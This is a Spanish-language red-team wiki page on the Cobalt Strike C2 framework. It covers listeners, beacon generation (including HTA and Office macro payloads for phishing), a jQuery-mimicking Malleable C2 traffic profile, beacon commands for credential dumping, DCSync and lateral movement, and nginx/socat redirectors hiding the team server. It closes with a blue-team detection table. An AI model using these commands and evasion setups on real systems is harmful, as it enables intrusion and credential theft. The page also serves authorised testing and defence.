---
icon: transmission
---

# Cobalt Strike

Cobalt Strike es el framework de C2 comercial más extendido en la industria del red team. Desarrollado originalmente por Raphael Mudge y actualmente mantenido por Fortra, es el estándar de facto en engagements corporativos. Sus implantes se llaman **Beacons** y se comunican con el **Team Server** a través de perfiles de comunicación configurables llamados **Malleable C2 Profiles**, que permiten camuflar el tráfico imitando aplicaciones legítimas.

Su popularidad tiene una contrapartida: es también el C2 más estudiado por los defensores, con detecciones en prácticamente todos los EDRs modernos. Operar con Cobalt Strike sin customización avanzada en entornos con EDR es hoy prácticamente inviable.

### Arquitectura

```
[Operador] → Cobalt Strike Client → [Team Server] ← Beacon en el target
```

El **Team Server** es el servidor Java que gestiona todas las operaciones. Los clientes se conectan a él mediante contraseña compartida. Múltiples operadores pueden trabajar simultáneamente sobre las mismas sesiones.

### Instalación y arranque

```bash
# El Team Server requiere licencia válida
# Arrancar el server
./teamserver <IP> <contraseña> [malleable_c2_profile.profile]

# Cliente — conectar al teamserver
./cobaltstrike
# Host: IP del teamserver
# Port: 50050
# Password: la contraseña del server
```

### Listeners

Los listeners definen cómo el Beacon contacta al Team Server:

```
Cobalt Strike → Listeners → Add

# Tipos de listener:
# Beacon HTTP / HTTPS  — más común, customizable con Malleable C2
# Beacon DNS           — muy sigiloso, lento
# Beacon SMB           — lateral movement sin tocar red externa (pipe)
# Beacon TCP           — conexión TCP directa
# Foreign HTTP/S       — para pasar sesiones a otro C2 (Metasploit, etc.)
```

### Generación de Beacons

```
# Desde el menú: Attacks → Packages
Attacks → Packages → Windows EXE         # ejecutable .exe
Attacks → Packages → Windows DLL         # DLL reflectiva
Attacks → Packages → Stageless Payload   # payload sin stager (recomendado)
Attacks → Packages → HTML Application    # .hta para phishing
Attacks → Packages → MS Office Macro     # macro para documentos Office
Attacks → Packages → Payload Generator   # shellcode raw para loaders externos

# Staged vs Stageless
# Staged: el implante inicial descarga el beacon real — más pequeño, más detectable
# Stageless: el beacon completo en un solo archivo — más grande, menos contactos de red
```

> Los beacons staged de Cobalt Strike son extremadamente conocidos y detectados por prácticamente todos los AV/EDR. En engagements reales se usan stageless con Malleable C2 + loader personalizado.

### Malleable C2 Profiles

Los perfiles Malleable C2 son la característica más potente de Cobalt Strike. Permiten definir exactamente cómo se ve el tráfico del beacon en la red: cabeceras HTTP, URIs, user-agents, cómo se codifican los datos, etc.

```
# Ejemplo de perfil básico imitando jQuery
set sleeptime "3000";
set jitter "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";

http-get {
    set uri "/jquery-3.3.1.min.js";
    client {
        header "Accept" "*/*";
        header "Referer" "https://code.jquery.com/";
        metadata {
            base64url;
            prepend "/__utm=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/javascript";
        output {
            base64url;
            print;
        }
    }
}
```

```bash
# Validar un perfil antes de usarlo
./c2lint perfil.profile

# Perfiles públicos de referencia
# github.com/BC-SECURITY/Malleable-C2-Profiles
# github.com/rsmudge/Malleable-C2-Profiles
```

### Comandos dentro del Beacon

Una vez el beacon conecta, se interactúa desde la consola de Cobalt Strike o la Beacon Console:

```
# Información básica
sleep 60 10          # sleep 60s con 10% jitter
getuid               # usuario actual
getsystem            # intentar elevar a SYSTEM
ps                   # lista de procesos
pwd / ls / cd

# Ejecución
shell <cmd>          # ejecutar en cmd.exe
run <binario>        # ejecutar sin shell
powershell <cmd>     # PowerShell
execute-assembly     # .NET en memoria

# Credenciales
hashdump             # volcar SAM
logonpasswords       # Mimikatz sekurlsa::logonpasswords
dcsync <usuario>     # DCSync via Mimikatz

# Movimiento lateral
jump psexec <target> <listener>    # PsExec con beacon
jump winrm <target> <listener>     # WinRM con beacon
jump psexec_psh <target> <listener>

# Port forwarding y pivoting
socks 1080           # SOCKS4a proxy
rportfwd 8080 192.168.1.10 80      # port forward reverso
```

### BOF — Beacon Object Files

Los BOFs permiten ejecutar código C compilado directamente en el proceso del beacon sin crear nuevos procesos. Son sigilosos porque no generan eventos de creación de proceso:

```
# Cargar y ejecutar un BOF
inline-execute /ruta/bof.o [argumentos]

# BOFs populares:
# TrustedSec/CS-Situational-Awareness-BOF  — enumeración sigilosa
# outflanknl/cs-situational-awareness-bof  — alternativa
# github.com/ajpc500/BOFs                  — colección general
```

### Aggressor Scripts

Cobalt Strike se extiende con scripts en Aggressor Script (lenguaje propio basado en Sleep):

```
# Cargar script desde el menú
Cobalt Strike → Script Manager → Load

# Ejemplo básico — alias personalizado
alias mialias {
    binput($1, "ejecutando mialias");
    bshell($1, "whoami && hostname");
}
```

### Infraestructura de redirección

En operaciones reales, nunca se expone el Team Server directamente. Se usa una cadena de redirectores:

```
Target → Redirector (nginx/Apache) → Team Server (oculto)

# Configuración nginx como redirector HTTP
location /jquery-3.3.1.min.js {
    proxy_pass https://teamserver-real:443;
    proxy_ssl_verify off;
}

# Redirector con socat (simple)
socat TCP4-LISTEN:80,fork TCP4:teamserver:80
```

### Detección — perspectiva Blue Team

| Indicador                    | Descripción                                                  |
| ---------------------------- | ------------------------------------------------------------ |
| Patrones de staging          | GET a URIs cortas seguido de download de PE grande           |
| Pipe names                   | `\\.\pipe\msagent_*`, `\\.\pipe\MSSE-*` — SMB beacon         |
| Certificados por defecto     | CN=Major Cobalt Strike, emisor conocido                      |
| Llamadas API características | `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` |
| Nombres de proceso           | `artifact.exe`, beacons en procesos no habituales            |
| Malleable C2 conocidos       | Perfiles públicos tienen firmas en Suricata/Snort            |

> Herramientas como **1768.py** (didier stevens) y **CobaltStrikeParser** permiten extraer configuración de beacons capturados, incluyendo el Team Server real detrás de redirectores. Los defensores las usan activamente.
